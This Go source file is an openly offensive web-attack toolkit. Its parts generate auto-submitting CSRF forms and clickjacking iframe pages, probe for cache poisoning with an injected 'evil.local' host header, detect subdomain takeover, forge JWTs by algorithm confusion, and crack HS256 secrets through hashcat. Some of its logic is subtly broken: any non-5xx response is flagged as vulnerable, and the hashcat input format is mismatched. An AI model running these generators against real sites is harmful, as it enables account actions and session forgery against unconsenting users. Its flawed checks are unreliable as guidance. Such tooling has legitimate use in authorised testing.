package webattacks

import (
	"bytes"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"os/exec"
	"strings"
	"time"
)

// G1 — CSRF Token Bypass
type CSRFBypassEngine struct{}

func NewCSRFBypassEngine() *CSRFBypassEngine {
	return &CSRFBypassEngine{}
}

func (c *CSRFBypassEngine) AnalyzeToken(token string) map[string]interface{} {
	result := make(map[string]interface{})
	decoded, err := base64.StdEncoding.DecodeString(token)
	if err == nil {
		result["decoded"] = string(decoded)
	}
	if len(token) <= 10 {
		result["weak"] = true
		result["reason"] = "token too short"
	}
	return result
}

func (c *CSRFBypassEngine) GeneratePoC(targetURL, paramName, token string) string {
	return fmt.Sprintf(`<html><body>
<form action="%s" method="POST" id="f">
<input type="hidden" name="%s" value="%s" />
<input type="submit" value="Submit" />
</form>
<script>document.getElementById('f').submit();</script></body></html>`, targetURL, paramName, token)
}

// G2 — Subdomain Takeover
type SubdomainTakeoverEngine struct{}

func NewSubdomainTakeoverEngine() *SubdomainTakeoverEngine {
	return &SubdomainTakeoverEngine{}
}

func (s *SubdomainTakeoverEngine) VerifyTakeover(domain string) (string, error) {
	fingerprints := map[string]string{
		"github":  "There isn't a GitHub Pages site here",
		"heroku":  "No such app",
		"netlify": "Not Found - Request ID:",
		"s3":      "NoSuchBucket",
		"azure":   "404 - Site Not Found",
		"fastly":  "Fastly error: unknown domain:",
		"shopify": "Sorry, this shop is currently unavailable",
	}

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(fmt.Sprintf("https://%s", domain))
	if err != nil {
		return "", fmt.Errorf("check %s: %w", domain, err)
	}
	defer resp.Body.Close()

	var buf bytes.Buffer
	buf.ReadFrom(resp.Body)
	body := buf.String()

	for provider, fingerprint := range fingerprints {
		if strings.Contains(body, fingerprint) {
			return provider, nil
		}
	}
	return "", nil
}

// G3 — Web Cache Poisoning
type CachePoisonEngine struct{}

func NewCachePoisonEngine() *CachePoisonEngine {
	return &CachePoisonEngine{}
}

func (c *CachePoisonEngine) FindUnkeyedHeaders(targetURL string) []string {
	headers := []string{"X-Forwarded-Host", "X-Original-URL", "X-Rewrite-URL", "X-HTTP-Method-Override", "X-Forwarded-Scheme"}
	var vulnerable []string
	client := &http.Client{Timeout: 10 * time.Second}
	for _, h := range headers {
		req, _ := http.NewRequest("GET", targetURL, nil)
		req.Header.Set(h, "evil.local")
		resp, err := client.Do(req)
		if err == nil && resp.StatusCode < 500 {
			vulnerable = append(vulnerable, h)
		}
		if resp != nil {
			resp.Body.Close()
		}
	}
	return vulnerable
}

// G4 — Clickjacking PoC
type ClickjackingEngine struct{}

func NewClickjackingEngine() *ClickjackingEngine {
	return &ClickjackingEngine{}
}

func (c *ClickjackingEngine) GeneratePoCPage(targetURL, buttonSelector string) string {
	return fmt.Sprintf(`<!DOCTYPE html>
<html>
<head><title>Clickjacking PoC</title></head>
<body>
<div style="position:absolute;top:0;left:0;width:100%%;height:100%%;z-index:1;">
  <iframe src="%s" style="opacity:0.5;width:800px;height:600px;" id="target"></iframe>
</div>
<div style="position:absolute;top:300px;left:400px;z-index:2;">
  <button onclick="alert('Clicked!')">Click Here</button>
</div>
<script>
function checkClickjack() {
  try { if (top.location.href != self.location.href) { return false } }
  catch(e) { return true }
}
</script>
</body>
</html>`, targetURL)
}

func (c *ClickjackingEngine) CheckFramingProtection(targetURL string) map[string]string {
	result := make(map[string]string)
	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Get(targetURL)
	if err != nil {
		result["error"] = err.Error()
		return result
	}
	defer resp.Body.Close()

	xfo := resp.Header.Get("X-Frame-Options")
	csp := resp.Header.Get("Content-Security-Policy")
	result["X-Frame-Options"] = xfo
	result["CSP"] = csp

	if xfo == "" && !strings.Contains(csp, "frame-ancestors") {
		result["vulnerable"] = "true"
	} else {
		result["vulnerable"] = "false"
	}
	return result
}

// G5 — JWT Cracking
type JWTCracker struct{}

func NewJWTCracker() *JWTCracker {
	return &JWTCracker{}
}

func (j *JWTCracker) ParseJWT(token string) (map[string]interface{}, error) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return nil, fmt.Errorf("invalid JWT: expected 3 parts, got %d", len(parts))
	}

	result := make(map[string]interface{})
	header, _ := base64.RawURLEncoding.DecodeString(parts[0])
	payload, _ := base64.RawURLEncoding.DecodeString(parts[1])
	result["header"] = string(header)
	result["payload"] = string(payload)
	result["signature"] = parts[2]

	var hdr map[string]interface{}
	json.Unmarshal(header, &hdr)
	result["alg"] = hdr["alg"]

	return result, nil
}

func (j *JWTCracker) AlgorithmConfusion(token, publicKeyPEM string) (string, error) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return "", fmt.Errorf("invalid token")
	}

	newHeader := fmt.Sprintf(`{"alg":"HS256","typ":"JWT"}`)
	newHeaderB64 := base64.RawURLEncoding.EncodeToString([]byte(newHeader))

	mac := hmac.New(sha256.New, []byte(publicKeyPEM))
	mac.Write([]byte(newHeaderB64 + "." + parts[1]))
	newSig := mac.Sum(nil)
	newSigB64 := base64.RawURLEncoding.EncodeToString(newSig)

	return fmt.Sprintf("%s.%s.%s", newHeaderB64, parts[1], newSigB64), nil
}

func (j *JWTCracker) CrackHS256(token string, wordlistPath string) (string, error) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return "", fmt.Errorf("invalid JWT")
	}
	sigBytes, _ := base64.RawURLEncoding.DecodeString(parts[2])
	signingInput := parts[0] + "." + parts[1]

	cmd := exec.Command("hashcat", "-m", "16500", "-a", "0",
		hex.EncodeToString(sigBytes)+":"+hex.EncodeToString([]byte(signingInput)),
		wordlistPath, "--force", "--quiet", "--show")
	var stdout bytes.Buffer
	cmd.Stdout = &stdout
	if err := cmd.Run(); err != nil {
		return "", fmt.Errorf("hashcat: %w", err)
	}
	return strings.TrimSpace(stdout.String()), nil
}
